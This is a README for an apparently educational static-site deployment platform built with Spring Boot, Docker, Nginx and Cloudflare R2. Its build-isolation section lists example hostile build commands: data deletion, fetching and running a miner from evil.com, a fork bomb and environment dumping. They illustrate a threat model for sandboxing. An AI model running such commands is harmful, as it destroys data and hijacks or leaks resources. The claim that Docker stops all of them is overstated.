# 🚀 Ghost Host — Mini Managed Static Deployment Platform

> A Vercel-like static site deployment platform built with Spring Boot, Docker, Nginx, and Cloudflare R2.

**Submit a GitHub repo → Build in Docker → Upload to R2 → Serve at `https://{id}.mydomain.com`**

---

## Table of Contents

- [Architecture](#architecture)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Configuration](#configuration)
- [API Reference](#api-reference)
- [How It Works](#how-it-works)
- [Secure Build Isolation](#secure-build-isolation)
- [Artifact Extraction](#artifact-extraction)
- [Cloudflare R2 Setup](#cloudflare-r2-setup)
- [Nginx Routing](#nginx-routing)
- [Scaling Beyond MVP](#scaling-beyond-mvp)
- [Common Mistakes](#common-mistakes)
- [Troubleshooting](#troubleshooting)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         USER / CLIENT                               │
│   curl -X POST /deploy  ─┐        Browser ─────────────┐           │
└───────────────────────────┼─────────────────────────────┼───────────┘
                            │                             │
                            ▼                             ▼
                  ┌──────────────────┐         ┌──────────────────────┐
                  │   Spring Boot    │         │       Nginx          │
                  │   API Server     │         │    Reverse Proxy     │
                  │   (port 8080)    │         │  *.mydomain.com:80   │
                  │                  │         │                      │
                  │  POST /deploy    │         │  Subdomain → R2      │
                  │  GET /deploy/:id │         │  mapping logic       │
                  │  GET /logs/:id   │         │                      │
                  └──────┬───────────┘         └──────────────────────┘
                         │                                ▲
                         │ enqueue                        │ serves
                         ▼                                │
                  ┌──────────────────┐                    │
                  │  In-Memory Queue │                    │
                  │  (BlockingQueue) │                    │
                  └──────┬───────────┘                    │
                         │ poll                           │
                         ▼                                │
                  ┌──────────────────┐                    │
                  │     Worker       │                    │
                  │                  │                    │
                  │  1. Clone repo   │                    │
                  │  2. Docker build │                    │
                  │  3. Extract out  │                    │
                  │  4. Upload → R2 ─┼────────────────────┘
                  │  5. Cleanup      │
                  └──────┬───────────┘
                         │
                  ┌──────┴───────────┐
                  │     Docker       │
                  │  (Build sandbox) │
                  │  CPU/Mem limits  │
                  │  Timeout kill    │
                  └──────────────────┘
```

### Components

| Component | What It Does |
|-----------|-------------|
| **Spring Boot API** | Accepts deploy requests, stores state in PostgreSQL, enqueues jobs |
| **In-Memory Queue** | `LinkedBlockingQueue` — simple MVP queue (replace with Redis later) |
| **Worker** | Polls queue, runs Docker builds, uploads to R2 |
| **Docker** | Isolated sandbox for untrusted builds (CPU/mem limits, timeout) |
| **PostgreSQL** | Stores users, deployments, build logs |
| **Cloudflare R2** | S3-compatible storage for built static files |
| **Nginx** | Wildcard reverse proxy: `{id}.domain.com` → R2 bucket |

### Data Flow

```
1. User → POST /deploy { repoUrl, buildCommand, outputDir }
2. API → creates Deployment (status=QUEUED) → enqueues job
3. Worker → polls job → docker run (clone → build → extract)
4. Worker → uploads build output to R2 at deployments/{id}/
5. Worker → updates Deployment (status=LIVE)
6. User → visits {id}.mydomain.com
7. Nginx → proxies to R2 → serves static files
```

---

## Prerequisites

Before you start, you need:

1. **Docker Desktop** (or Docker Engine on Linux)
   ```bash
   # Check Docker is running:
   docker --version
   # Should print something like: Docker version 24.0.7
   ```

2. **Docker Compose** (included with Docker Desktop)
   ```bash
   docker-compose --version
   ```

3. **A Cloudflare account** with R2 enabled (free tier: 10GB storage)
   - Go to https://dash.cloudflare.com → R2
   - Create a bucket called `ghosthost-deployments`
   - Enable public access on the bucket
   - Create an R2 API token (Object Read & Write permissions)

4. **A domain name** (optional for local testing, required for production)
   - You need wildcard DNS: `*.mydomain.com → your server IP`

---

## Quick Start

### 1. Clone and Configure

```bash
# Navigate to the project
cd g-host

# Copy the environment template
cp .env.example .env

# Edit .env with your values
# At minimum, set these:
#   R2_ACCESS_KEY=your_key
#   R2_SECRET_KEY=your_secret
#   R2_ENDPOINT=https://<account-id>.r2.cloudflarestorage.com
#   R2_BUCKET=ghosthost-deployments
#   R2_PUBLIC_URL=https://pub-<hash>.r2.dev
#   JWT_SECRET=some-random-32-char-string
```

### 2. Build the Builder Image

```bash
# This image is used as the sandbox for user builds
# It includes Node.js 20, Git, and common build tools
docker build -t ghosthost-builder -f docker/builder/Dockerfile.builder docker/builder/
```

### 3. Start Everything

```bash
docker-compose build
docker-compose up -d
```

This starts:
- PostgreSQL on port 5432
- Spring Boot API on port 8080
- Nginx on port 80 (and 443 for HTTPS)

### 4. Test It

```bash
# 1. Register a user
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"secret123"}'

# Response: {"token":"eyJhbGciOi..."}
# Save this token!

# 2. Deploy a site
curl -X POST http://localhost:8080/deploy \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -H "Content-Type: application/json" \
  -d '{
    "repoUrl": "https://github.com/nicholasgasior/example-vite-app.git",
    "buildCommand": "npm install && npm run build",
    "outputDir": "dist"
  }'

# Response: {"deploymentId":"a1b2c3d4","status":"QUEUED","siteUrl":"a1b2c3d4.mydomain.com"}

# 3. Check status (repeat until status is "LIVE")
curl http://localhost:8080/deploy/a1b2c3d4 \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"

# 4. View build logs
curl http://localhost:8080/logs/a1b2c3d4 \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"

# 5. Visit your site!
# If you have DNS set up: https://a1b2c3d4.mydomain.com
# For local testing, add to /etc/hosts: 127.0.0.1 a1b2c3d4.localhost
# Then visit: http://a1b2c3d4.localhost
```

---

## Configuration

All configuration is in `.env`. Here's what each variable does:

```bash
# ── PostgreSQL ──────────────────────────────
POSTGRES_USER=ghosthost          # Database username
POSTGRES_PASSWORD=changeme       # Database password (CHANGE THIS!)
POSTGRES_DB=ghosthost            # Database name

# ── JWT ─────────────────────────────────────
JWT_SECRET=your-secret-key       # Used to sign JWT tokens
                                 # Generate with: openssl rand -base64 32
                                 # MUST be at least 32 characters

# ── Cloudflare R2 ──────────────────────────
R2_ACCESS_KEY=...                # R2 API token access key
R2_SECRET_KEY=...                # R2 API token secret key
R2_ENDPOINT=https://...          # https://<account-id>.r2.cloudflarestorage.com
R2_BUCKET=ghosthost-deployments  # Your R2 bucket name
R2_PUBLIC_URL=https://pub-...    # Public URL for the bucket

# ── Domain ──────────────────────────────────
BASE_DOMAIN=mydomain.com         # Your domain (used for subdomain URLs)

# ── Docker Build Limits ────────────────────
DOCKER_MEMORY_LIMIT=512m         # Max memory per build container
DOCKER_CPU_LIMIT=1               # Max CPUs per build container
BUILD_TIMEOUT_SECONDS=300        # Kill builds after 5 minutes
```

---

## API Reference

### Authentication

#### `POST /auth/register`

Create a new account.

```bash
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"mypassword"}'
```

**Response (201):**
```json
{ "token": "eyJhbGciOiJIUzI1NiJ9..." }
```

**Errors:**
- `409` — Email already registered

#### `POST /auth/login`

Login with existing credentials.

```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"mypassword"}'
```

**Response (200):**
```json
{ "token": "eyJhbGciOiJIUzI1NiJ9..." }
```

**Errors:**
- `401` — Invalid email or password

### Deployments

All deployment endpoints require: `Authorization: Bearer <token>`

#### `POST /deploy`

Create a new deployment.

```bash
curl -X POST http://localhost:8080/deploy \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "repoUrl": "https://github.com/user/repo.git",
    "buildCommand": "npm install && npm run build",
    "outputDir": "dist"
  }'
```

**Request body:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `repoUrl` | string | yes | GitHub repo URL (must end with .git) |
| `buildCommand` | string | yes | Shell command to build the site |
| `outputDir` | string | yes | Directory containing build output |

**Response (202):**
```json
{
  "deploymentId": "a1b2c3d4",
  "status": "QUEUED",
  "repoUrl": "https://github.com/user/repo.git",
  "buildCommand": "npm install && npm run build",
  "outputDir": "dist",
  "siteUrl": "a1b2c3d4.mydomain.com",
  "createdAt": "2026-02-17T09:00:00",
  "updatedAt": "2026-02-17T09:00:00"
}
```

#### `GET /deploy/{id}`

Get deployment status.

```bash
curl http://localhost:8080/deploy/a1b2c3d4 \
  -H "Authorization: Bearer <token>"
```

**Status values:** `QUEUED` → `BUILDING` → `UPLOADING` → `LIVE` (or `FAILED`)

#### `GET /logs/{deploymentId}`

Get build logs.

```bash
curl http://localhost:8080/logs/a1b2c3d4 \
  -H "Authorization: Bearer <token>"
```

**Response (200):**
```json
{
  "deploymentId": "a1b2c3d4",
  "steps": [
    {
      "step": "BUILD",
      "status": "SUCCESS",
      "log": "=== CLONE ===\nCloning...\n=== BUILD ===\nnpm run build...",
      "startedAt": "2026-02-17T09:00:05",
      "finishedAt": "2026-02-17T09:01:12"
    },
    {
      "step": "UPLOAD",
      "status": "SUCCESS",
      "log": "Uploaded 42 files to R2",
      "startedAt": "2026-02-17T09:01:12",
      "finishedAt": "2026-02-17T09:01:18"
    }
  ]
}
```

---

## How It Works

### The Full Pipeline (Step by Step)

Here's exactly what happens when you call `POST /deploy`:

```
YOU                    API SERVER              WORKER                 DOCKER               R2
 │                        │                      │                      │                   │
 │── POST /deploy ───────>│                      │                      │                   │
 │                        │                      │                      │                   │
 │                        │── Create Deployment   │                      │                   │
 │                        │   (status=QUEUED)     │                      │                   │
 │                        │── Enqueue job ───────>│                      │                   │
 │                        │                      │                      │                   │
 │<── 202 {id, QUEUED} ──│                      │                      │                   │
 │                        │                      │                      │                   │
 │                        │                      │── docker run ────────>│                   │
 │                        │                      │   (with limits)       │                   │
 │                        │                      │                      │── git clone        │
 │                        │                      │                      │── npm install      │
 │                        │                      │                      │── npm run build    │
 │                        │                      │                      │── cp dist/* /output│
 │                        │                      │<── exit 0 ───────────│                   │
 │                        │                      │                      │                   │
 │                        │                      │── Upload files ──────────────────────────>│
 │                        │                      │   deployments/{id}/   │                   │
 │                        │                      │                      │                   │
 │                        │<── status=LIVE ──────│                      │                   │
 │                        │                      │                      │                   │
 │── GET /deploy/{id} ──>│                      │                      │                   │
 │<── {status: "LIVE"} ──│                      │                      │                   │
 │                        │                      │                      │                   │
 │── GET {id}.domain ────────────────────────────────────────────── Nginx ──> R2 ── files   │
 │<── index.html ────────────────────────────────────────────────────────────────────────────│
```

---

## Secure Build Isolation

### Why Docker Is Needed

Users submit arbitrary build commands. Without isolation, a malicious user could:

```bash
# Delete your server's files
"buildCommand": "rm -rf /"

# Mine cryptocurrency on your server
"buildCommand": "wget evil.com/miner && ./miner"

# Crash your server (fork bomb)
"buildCommand": ":(){ :|:& };:"

# Steal environment variables
"buildCommand": "env > /output/env.txt"
```

Docker prevents ALL of these:

| Threat | How Docker Prevents It |
|--------|----------------------|
| **File deletion** | Container has its own filesystem. `rm -rf /` only affects the container |
| **CPU hogging** | `--cpus=1` limits to one CPU core |
| **Memory exhaustion** | `--memory=512m` kills the container if it exceeds 512MB |
| **Infinite loops** | `BUILD_TIMEOUT_SECONDS=300` kills after 5 minutes |
| **Fork bombs** | Memory limit prevents spawning unlimited processes |
| **Network attacks** | Can add `--network=none` (currently allowed for git clone) |
| **Env var theft** | Container doesn't inherit host environment variables |

### Docker Run Command Explained

```bash
docker run \
  --name ghosthost-build-abc123 \    # Unique name for cleanup
  --memory 512m \                     # Max 512MB RAM
  --cpus 1 \                          # Max 1 CPU core
  -v /tmp/ghosthost-builds/abc123:/output \  # Bind mount for output
  --rm \                              # Auto-remove container on exit
  ghosthost-builder \                 # Our builder image (Node.js + Git)
  bash -c "                           # The build script:
    git clone --depth 1 <repo> /workspace/repo &&
    cd /workspace/repo &&
    npm install && npm run build &&
    cp -r dist/* /output/
  "
```

---

## Artifact Extraction

### How Build Output Gets From Container to Host

We use **bind mounts** (not `docker cp`).

**What's a bind mount?**
It maps a host directory into the container. When the container writes to `/output`, the files appear on the host at `/tmp/ghosthost-builds/{id}/`.

```
HOST                              CONTAINER
/tmp/ghosthost-builds/abc123/  ←→  /output/
                                   │
                                   ├── index.html
                                   ├── assets/
                                   │   ├── style.css
                                   │   └── app.js
                                   └── favicon.ico
```

**Why bind mounts instead of `docker cp`?**
- `docker cp` requires the container to still exist
- With `--rm`, the container is auto-removed after exit
- Bind mounts work regardless — files are on the host immediately
- No extra step needed after the build finishes

**After upload, we clean up:**
```java
// Delete all files in /tmp/ghosthost-builds/abc123/
dockerBuildExecutor.cleanup(result.outputPath());
```

---

## Cloudflare R2 Setup

### Step-by-Step R2 Configuration

1. **Go to Cloudflare Dashboard** → R2 → Create bucket
   - Bucket name: `ghosthost-deployments`
   - Location: Auto (or choose nearest to your server)

2. **Enable public access** on the bucket:
   - Bucket Settings → Public Access → Enable
   - This gives you a public URL like: `https://pub-abc123.r2.dev`

3. **Create an API token**:
   - R2 → Manage R2 API Tokens → Create API Token
   - Permissions: Object Read & Write
   - Scope: Apply to specific bucket → `ghosthost-deployments`
   - Copy the Access Key ID and Secret Access Key

4. **Set in .env**:
   ```bash
   R2_ACCESS_KEY=your_access_key_id
   R2_SECRET_KEY=your_secret_access_key
   R2_ENDPOINT=https://your-account-id.r2.cloudflarestorage.com
   R2_BUCKET=ghosthost-deployments
   R2_PUBLIC_URL=https://pub-your-hash.r2.dev
   ```

### File Structure in R2

```
ghosthost-deployments/          (bucket)
├── deployments/
│   ├── a1b2c3d4/               (deployment ID)
│   │   ├── index.html
│   │   ├── assets/
│   │   │   ├── style-abc123.css
│   │   │   └── main-def456.js
│   │   └── favicon.ico
│   ├── e5f6g7h8/               (another deployment)
│   │   ├── index.html
│   │   └── ...
```

### How Upload Works (Code)

```java
// R2StorageService.java (simplified)
public int uploadDirectory(Path localDir, String deploymentId) {
    Files.walk(localDir)
         .filter(Files::isRegularFile)
         .forEach(file -> {
             String key = "deployments/" + deploymentId + "/" + relativize(file);
             s3Client.putObject(
                 PutObjectRequest.builder()
                     .bucket("ghosthost-deployments")
                     .key(key)
                     .contentType(detectMimeType(file))
                     .build(),
                 RequestBody.fromFile(file)
             );
         });
}
```

---

## Nginx Routing

### How Subdomain → R2 Mapping Works

```
Browser requests: http://a1b2c3d4.mydomain.com/assets/style.css
                        └────┬────┘ └───┬──┘  └──────┬──────┘
                             │         │              │
                        deployment  domain      file path
                            ID

Nginx extracts "a1b2c3d4" from Host header using regex:
  server_name ~^(?<deployment_id>[a-zA-Z0-9-]+)\.(.+)$;

Then proxies to R2:
  proxy_pass R2_PUBLIC_URL/deployments/a1b2c3d4/assets/style.css
```

### Local Testing (Without DNS)

For local testing, add entries to your hosts file:

**Windows:** `C:\Windows\System32\drivers\etc\hosts`
**Mac/Linux:** `/etc/hosts`

```
127.0.0.1  a1b2c3d4.localhost
127.0.0.1  e5f6g7h8.localhost
```

Then visit: `http://a1b2c3d4.localhost`

### Wildcard SSL (Production)

For HTTPS, you need a wildcard SSL certificate for `*.mydomain.com`:

1. **Using Let's Encrypt (free):**
   ```bash
   # Install certbot with DNS plugin
   sudo apt install certbot python3-certbot-dns-cloudflare

   # Create Cloudflare API credentials file
   echo "dns_cloudflare_api_token = your-cloudflare-api-token" > ~/.cloudflare.ini
   chmod 600 ~/.cloudflare.ini

   # Get wildcard cert
   sudo certbot certonly \
     --dns-cloudflare \
     --dns-cloudflare-credentials ~/.cloudflare.ini \
     -d "*.mydomain.com" \
     -d "mydomain.com"
   ```

2. **Place certs in the nginx/certs/ directory:**
   ```bash
   cp /etc/letsencrypt/live/mydomain.com/fullchain.pem nginx/certs/mydomain.com.crt
   cp /etc/letsencrypt/live/mydomain.com/privkey.pem nginx/certs/mydomain.com.key
   ```

3. **Uncomment the HTTPS block** in `nginx/nginx.conf`

---

## Scaling Beyond MVP

The MVP runs everything in a single machine. Here's how to scale each component.

### 1. Replace In-Memory Queue with Redis

**Why:** The in-memory queue loses jobs on restart. Redis persists jobs and allows multiple workers.

```java
// BEFORE (QueueService.java)
private final BlockingQueue<String> queue = new LinkedBlockingQueue<>();

// AFTER (RedisQueueService.java)
@Service
public class RedisQueueService {
    private final StringRedisTemplate redis;

    public boolean enqueue(String deploymentId) {
        redis.opsForList().rightPush("build:queue", deploymentId);
        return true;
    }

    public String poll() {
        // BLPOP waits up to 2 seconds for a job
        return redis.opsForList().leftPop("build:queue", Duration.ofSeconds(2));
    }
}
```

Add to `docker-compose.yml`:
```yaml
redis:
  image: redis:7-alpine
  ports:
    - "6379:6379"
```

Add to `pom.xml`:
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-redis</artifactId>
</dependency>
```

### 2. Horizontal Workers

**Why:** One worker = one build at a time. Multiple workers = parallel builds.

```yaml
# docker-compose.yml
worker:
  build: ./api
  deploy:
    replicas: 3          # Run 3 worker instances
  environment:
    WORKER_MODE: true     # Only run the worker, not the API
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock
```

You'd need to add a `WORKER_MODE` flag that disables the web server and only runs the `@Scheduled` worker.

### 3. Metrics & Monitoring

Add Spring Boot Actuator + Prometheus:

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-registry-prometheus</artifactId>
</dependency>
```

Custom metrics to track:
```java
@Component
public class DeployMetrics {
    private final Counter deploysTotal;
    private final Counter deploysFailed;
    private final Timer buildDuration;

    public DeployMetrics(MeterRegistry registry) {
        deploysTotal = Counter.builder("deploys.total").register(registry);
        deploysFailed = Counter.builder("deploys.failed").register(registry);
        buildDuration = Timer.builder("build.duration").register(registry);
    }
}
```

### 4. Rate Limiting

Prevent abuse with a simple token bucket:

```java
@Component
public class RateLimiter {
    // Max 5 deploys per user per hour
    private final Map<Long, List<Instant>> userDeploys = new ConcurrentHashMap<>();

    public boolean isAllowed(Long userId) {
        List<Instant> deploys = userDeploys.computeIfAbsent(userId, k -> new ArrayList<>());
        Instant oneHourAgo = Instant.now().minus(1, ChronoUnit.HOURS);
        deploys.removeIf(t -> t.isBefore(oneHourAgo));
        if (deploys.size() >= 5) return false;
        deploys.add(Instant.now());
        return true;
    }
}
```

### 5. Centralized Logging

Send all logs to a central location:

```yaml
# docker-compose.yml
services:
  api:
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"
```

For production, use Grafana Loki or the ELK stack.

---

## Database Schema

```sql
-- USERS: registered platform users
CREATE TABLE users (
    id            BIGSERIAL PRIMARY KEY,
    email         VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,      -- BCrypt hashed
    created_at    TIMESTAMP DEFAULT NOW()
);

-- DEPLOYMENTS: one row per deploy request
CREATE TABLE deployments (
    id             VARCHAR(36) PRIMARY KEY,   -- UUID, also the subdomain
    user_id        BIGINT REFERENCES users(id),
    repo_url       VARCHAR(2048),
    build_command  VARCHAR(1024) NOT NULL,
    output_dir     VARCHAR(512)  NOT NULL,
    status         VARCHAR(50)   DEFAULT 'QUEUED',
    site_url       VARCHAR(2048),
    error_message  TEXT,
    created_at     TIMESTAMP DEFAULT NOW(),
    updated_at     TIMESTAMP DEFAULT NOW()
);

-- BUILD_JOBS: logs for each pipeline step
CREATE TABLE build_jobs (
    id             BIGSERIAL PRIMARY KEY,
    deployment_id  VARCHAR(36) REFERENCES deployments(id),
    step           VARCHAR(100) NOT NULL,     -- BUILD, UPLOAD, CLEANUP
    status         VARCHAR(50)  NOT NULL,     -- RUNNING, SUCCESS, FAILED
    log_output     TEXT,
    started_at     TIMESTAMP DEFAULT NOW(),
    finished_at    TIMESTAMP
);
```

---

## Folder Structure

```
g-host/
├── api/                                    # Spring Boot backend
│   ├── Dockerfile                          # Multi-stage: Maven build → JRE runtime
│   ├── pom.xml                             # Dependencies
│   └── src/main/
│       ├── java/com/ghosthost/api/
│       │   ├── GhostHostApplication.java   # Entry point
│       │   ├── config/
│       │   │   ├── SecurityConfig.java     # JWT auth rules
│       │   │   └── R2Config.java           # S3 client for R2
│       │   ├── controller/
│       │   │   ├── AuthController.java     # /auth/register, /auth/login
│       │   │   └── DeployController.java   # /deploy, /deploy/{id}, /logs/{id}
│       │   ├── dto/
│       │   │   ├── AuthRequest.java
│       │   │   ├── DeployRequest.java
│       │   │   └── DeployResponse.java
│       │   ├── entity/
│       │   │   ├── User.java
│       │   │   ├── Deployment.java
│       │   │   └── BuildJob.java
│       │   ├── repository/
│       │   │   ├── UserRepository.java
│       │   │   ├── DeploymentRepository.java
│       │   │   └── BuildJobRepository.java
│       │   ├── security/
│       │   │   ├── JwtUtil.java            # Token generation/validation
│       │   │   └── JwtAuthFilter.java      # Request filter
│       │   ├── service/
│       │   │   ├── AuthService.java
│       │   │   ├── DeployService.java
│       │   │   ├── QueueService.java       # In-memory queue
│       │   │   └── R2StorageService.java   # Upload to R2
│       │   └── worker/
│       │       ├── BuildWorker.java        # Queue poller
│       │       └── DockerBuildExecutor.java # Docker orchestration
│       └── resources/
│           ├── application.yml             # All configuration
│           └── schema.sql                  # Database DDL
├── nginx/
│   ├── Dockerfile
│   ├── nginx.conf                          # Subdomain → R2 routing
│   └── certs/                              # Wildcard SSL certs
├── docker/
│   └── builder/
│       └── Dockerfile.builder              # Build sandbox image
├── docker-compose.yml                      # Orchestrates everything
├── .env.example                            # Environment variables template
└── README.md                               # This file
```

---

## Common Mistakes

### 1. "Docker socket permission denied"

```
Cannot connect to the Docker daemon. Is the docker daemon running?
```

**Fix:** Make sure Docker Desktop is running and the socket is mounted:
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```

On Linux, you may need to add your user to the `docker` group:
```bash
sudo usermod -aG docker $USER
```

### 2. "Builder image not found"

```
Unable to find image 'ghosthost-builder:latest' locally
```

**Fix:** Build the builder image first:
```bash
docker build -t ghosthost-builder -f docker/builder/Dockerfile.builder docker/builder/
```

### 3. "Build output directory is empty"

```
ERROR: No build output found in /output
```

**Fix:** Check that your `outputDir` matches what your build creates:
- Vite → `dist`
- Create React App → `build`
- Next.js (static export) → `out`

### 4. "R2 upload fails with 403"

```
AccessDenied: Access Denied
```

**Fix:** Check your R2 API token:
- Must have "Object Read & Write" permission
- Must be scoped to the correct bucket
- Check that `R2_ENDPOINT` includes your account ID

### 5. "JWT token expired"

```
401 Unauthorized
```

**Fix:** Tokens expire after 24 hours. Login again to get a new token:
```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"secret123"}'
```

---

## Troubleshooting

### Check container logs

```bash
# API logs
docker logs ghosthost-api -f

# Nginx logs
docker logs ghosthost-nginx -f

# All services
docker-compose logs -f
```

### Check database

```bash
# Connect to PostgreSQL
docker exec -it ghosthost-db psql -U ghosthost

# Check deployments
SELECT id, status, error_message FROM deployments ORDER BY created_at DESC;

# Check build logs
SELECT * FROM build_jobs WHERE deployment_id = 'abc12345';
```

### Check R2 bucket

```bash
# List files in R2 (using AWS CLI with R2 endpoint)
aws s3 ls s3://ghosthost-deployments/deployments/ \
  --endpoint-url https://your-account-id.r2.cloudflarestorage.com
```

### Reset everything

```bash
docker-compose down -v   # -v removes volumes (database data!)
docker-compose up -d     # Fresh start
```

---

## License

MIT — Use it, modify it, deploy it. Built for learning.
#   g - h o s t  
 